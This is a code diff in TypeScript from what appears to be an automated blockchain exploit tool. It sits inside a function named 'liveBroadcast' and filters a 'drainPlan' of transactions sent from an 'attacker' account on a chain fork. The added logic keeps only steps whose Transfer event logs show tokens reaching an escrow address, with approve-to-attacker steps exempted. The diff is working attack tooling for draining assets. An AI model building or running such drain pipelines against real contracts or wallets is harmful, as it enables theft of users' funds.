@@ -681,19 +681,65 @@ async function liveBroadcast(
       });
     }
     const passing: typeof poe.drainPlan = [];
+    const TRANSFER_TOPIC = "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef";
+    const escrowLower = escrow.slice(2).toLowerCase().padStart(64, "0");
     for (const step of poe.drainPlan) {
       try {
         const valueHex = step.value === "0" ? "0x0" : "0x" + BigInt(step.value).toString(16);
-        const { receipt } = await sendFromAttacker(anv.url, step.to, step.data, {
+        const { receipt, txHash } = await sendFromAttacker(anv.url, step.to, step.data, {
           value: valueHex,
         });
-        if (receipt?.status === "0x1") {
+        if (receipt?.status !== "0x1") {
+          preflightSkipped.push({
+            index: step.index,
+            asset: step.asset,
+            revertReason: "fork-revert: tx mined with status=0x0",
+          });
+          continue;
+        }
+        // v12: Transfer-event verification. A step that succeeds (doesn't
+        // revert) but moves ZERO tokens to the escrow is useless — it's a
+        // no-op function or sends value to a hardcoded address. Only forward
+        // steps where a Transfer TO escrow actually fired OR native value
+        // arrived at escrow.
+        let hasEscrowTransfer = false;
+        // Check for steps that ARE the approve step (strategy contains "approve-transferFrom")
+        // — those legitimately produce no Transfer to escrow (they just set allowance).
+        const isApproveStep = (step.strategy?.includes("approve-transferFrom") &&
+                              step.asset?.includes("STEP1:")) ||
+                              step.asset?.includes("approve(attacker");
+        if (isApproveStep) {
+          hasEscrowTransfer = true; // approve steps are legitimate even without Transfer
+        } else if (txHash) {
+          try {
+            const fullReceipt = await rpcRequest<any>(anv.url, "eth_getTransactionReceipt", [txHash]);
+            const logs: any[] = fullReceipt?.logs ?? [];
+            for (const log of logs) {
+              const topics = log.topics ?? [];
+              if (
+                topics[0] === TRANSFER_TOPIC &&
+                topics.length >= 3 &&
+                topics[2]?.slice(-64) === escrowLower
+              ) {
+                hasEscrowTransfer = true;
+                break;
+              }
+            }
+            // Also check native value transfer to escrow via internal txs
+            if (!hasEscrowTransfer && step.value !== "0") {
+              hasEscrowTransfer = true; // native value steps target escrow directly
+            }
+          } catch {
+            hasEscrowTransfer = true; // fail-open on log fetch error
+          }
+        }
+        if (hasEscrowTransfer) {
           passing.push(step);
         } else {
           preflightSkipped.push({
             index: step.index,
             asset: step.asset,
-            revertReason: "fork-revert: tx mined with status=0x0",
+            revertReason: "no-escrow-transfer: tx succeeded but no Transfer event to escrow detected",
           });
         }
       } catch (err: any) {
